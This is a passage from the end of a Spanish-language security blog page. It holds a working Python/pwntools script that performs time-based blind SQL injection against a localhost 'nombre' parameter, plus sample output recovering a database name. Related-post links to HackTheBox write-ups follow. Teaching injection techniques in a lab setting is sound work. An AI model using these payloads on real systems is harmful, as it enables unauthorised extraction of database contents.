</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Probando con: e
</span></span><span class=line><span class=cl><span class=o>[</span> <span class=o>]</span> Base de datos en uso: 
</span></span><span class=line><span class=cl>    <span class=o>[</span>*<span class=o>]</span> my_database
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Base de datos en uso&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>databases</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>db</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select database() limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>db_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>databases</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>db_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select database() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>databases</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>databases</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div></details></div></div></article></div></div><div class=bg-light><section class="section section-related container"><div class="row justify-content-center"><div class="col-md-12 col-lg-9"><h2 class="section-title text-center">Related posts</h2></div></div><div class="row justify-content-center"><div class=col-lg-9><div class=card><div class=card-body><article><h2 class=h3><a class="stretched-link text-body" href=/writeups/hackthebox/enterprise/>Enterprise</a></h2><p>En este writeup vamos a estar resolviendo la máquina Enterprise de la plataforma de HackTheBox, Es una máquina medium muy interesante, Vamos a estar tocando enumeración web de Wordpress y Joomla, SQL injections, Vamos a escapar de un docker y por último vamos a explotar un Buffer overflow muy interesante con la técnica ret2libc</p><p><small>November 11, 2023<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>29&nbsp;minutes</span></small></p></article></div></div><div class=card><div class=card-body><article><h2 class=h3><a class="stretched-link text-body" href=/writeups/hackthebox/jupiter/>Jupiter</a></h2><p>En la máquina de hoy vamos a estar tocando enumeración de subdominios, derivaremos una inyección postgresql a un RCE. Y para la escalada tocaremos tareas cron, portfordwarding y python</p><p><small>November 1, 2023<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>16&nbsp;minutes</span></small></p></article></div></div><div class=card><div class=card-body><article><h2 class=h3><a class="stretched-link text-body" href=/writeups/hackthebox/toolbox/>Toolbox</a></h2><p></p><p><small>October 29, 2023<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>11&nbsp;minutes</span></small></p></article></div></div></div></div></section></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>